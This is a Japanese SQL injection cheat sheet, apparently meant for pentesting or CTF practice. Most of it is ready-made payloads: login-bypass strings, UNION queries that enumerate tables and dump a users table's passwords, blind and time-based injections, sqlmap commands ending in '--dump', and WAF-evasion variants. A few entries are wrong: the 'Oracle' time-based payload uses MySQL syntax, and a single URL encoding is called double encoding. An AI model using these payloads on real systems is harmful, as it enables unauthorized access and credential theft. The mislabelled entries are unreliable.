# SQL インジェクション チートシート

---

## 1. コメント記法（DBごとの違い）

| DB | コメント記法 |
|---|---|
| MySQL | `#` / `-- -` / `/*comment*/` |
| PostgreSQL | `-- -` / `/*comment*/` |
| MSSQL | `--` / `/*comment*/` |
| Oracle | `--` |

---

## 2. 認証バイパス（ログインフォーム）

### Username 欄に入れる

```
admin' #
admin'-- -
admin'/*
' or 1=1#
' or 1=1-- -
' or '1'='1'#
' or '1'='1'-- -
' or 'x'='x'#
```

### Password 欄に入れる

```
' or '1'='1
' or 1=1#
anything' or 'x'='x
```

### 組み合わせ例

| Username | Password | 備考 |
|---|---|---|
| `admin' #` | (空) | MySQL で最もよく通る |
| `admin'-- -` | (空) | MySQL / PostgreSQL |
| `' or 1=1#` | (空) | MySQL |
| `admin` | `' or '1'='1'#` | Password 側に注入 |

---

## 3. DB 判別ペイロード

エラーメッセージや応答の違いでDBを特定する。

```sql
-- MySQL
' AND 1=1-- -           → 正常
' AND 1=2-- -           → 異常（差があればSQLi確定）
' AND version()=version()-- -

-- PostgreSQL
' AND 1=1-- -
' AND version()=version()-- -

-- MSSQL
' AND 1=1--
' AND @@version=@@version--

-- Oracle
' AND 1=1--
' AND rownum=rownum--
```

---

## 4. バージョン・情報取得

```sql
-- MySQL
' UNION SELECT @@version,null-- -
' UNION SELECT user(),null-- -
' UNION SELECT database(),null-- -

-- PostgreSQL
' UNION SELECT version(),null-- -
' UNION SELECT current_user,null-- -

-- MSSQL
' UNION SELECT @@version,null--
' UNION SELECT system_user,null--

-- Oracle
' UNION SELECT banner,null FROM v$version--
```

---

## 5. UNION ベース インジェクション

### カラム数の特定

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -   ← エラーが出た数 - 1 がカラム数
```

または

```sql
' UNION SELECT null-- -
' UNION SELECT null,null-- -
' UNION SELECT null,null,null-- -   ← エラーが消えた数がカラム数
```

### 文字列が表示されるカラムを特定

```sql
' UNION SELECT 'a',null,null-- -
' UNION SELECT null,'a',null-- -
' UNION SELECT null,null,'a'-- -
```

### テーブル名の取得

```sql
-- MySQL / PostgreSQL
' UNION SELECT table_name,null FROM information_schema.tables-- -

-- MSSQL
' UNION SELECT table_name,null FROM information_schema.tables--

-- Oracle
' UNION SELECT table_name,null FROM all_tables--
```

### カラム名の取得

```sql
-- MySQL / PostgreSQL / MSSQL
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'-- -

-- Oracle
' UNION SELECT column_name,null FROM all_tab_columns WHERE table_name='USERS'--
```

### データ取得

```sql
' UNION SELECT username,password FROM users-- -
' UNION SELECT username,password FROM users LIMIT 1 OFFSET 0-- -
```

---

## 6. ブラインド SQLi

### Boolean ベース

```sql
' AND 1=1-- -   → True（正常応答）
' AND 1=2-- -   → False（異常応答）

-- 文字を1文字ずつ推測
' AND SUBSTRING(username,1,1)='a'-- -
' AND SUBSTRING(password,1,1)='a'-- -
```

### Time ベース

```sql
-- MySQL
' AND SLEEP(5)-- -

-- PostgreSQL
' AND pg_sleep(5)-- -

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- Oracle
' AND 1=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
```

---

## 7. sqlmap の基本コマンド

```bash
# 基本スキャン
sqlmap -u "http://target/page.php?id=1"

# POST リクエスト
sqlmap -u "http://target/login" --data="username=admin&password=test"

# Cookie を使う
sqlmap -u "http://target/" --cookie="session=abc123"

# DB名取得
sqlmap -u "http://target/?id=1" --dbs

# テーブル取得
sqlmap -u "http://target/?id=1" -D dbname --tables

# データ取得
sqlmap -u "http://target/?id=1" -D dbname -T users --dump

# レベルとリスクを上げる（より多くのペイロードを試す）
sqlmap -u "http://target/?id=1" --level=3 --risk=2

# Burp のリクエストファイルを使う
sqlmap -r request.txt
```

---

## 8. エラーメッセージ別 DB 判別

| エラーメッセージ | DB |
|---|---|
| `You have an error in your SQL syntax` | MySQL |
| `Warning: mysql_` | MySQL |
| `ORA-` | Oracle |
| `PostgreSQL ... ERROR` | PostgreSQL |
| `Microsoft OLE DB` / `ODBC SQL Server` | MSSQL |
| `Unclosed quotation mark` | MSSQL |

---

## 9. WAF バイパステクニック

```sql
-- 大文字小文字の混在
' Or 1=1-- -
' oR 1=1-- -

-- コメントで分割
' /*!or*/ 1=1-- -
' or/**/1=1-- -

-- 空白の代替
'%09or%091=1-- -   (タブ)
'%0aor%0a1=1-- -   (改行)

-- 二重エンコード
%27 or 1=1-- -

-- 文字列結合（MySQL）
' or 'a'='a
CONCAT(0x61,0x64,0x6d,0x69,0x6e)   → 'admin'

-- 16進数
SELECT 0x61646d696e   → 'admin'
```

---

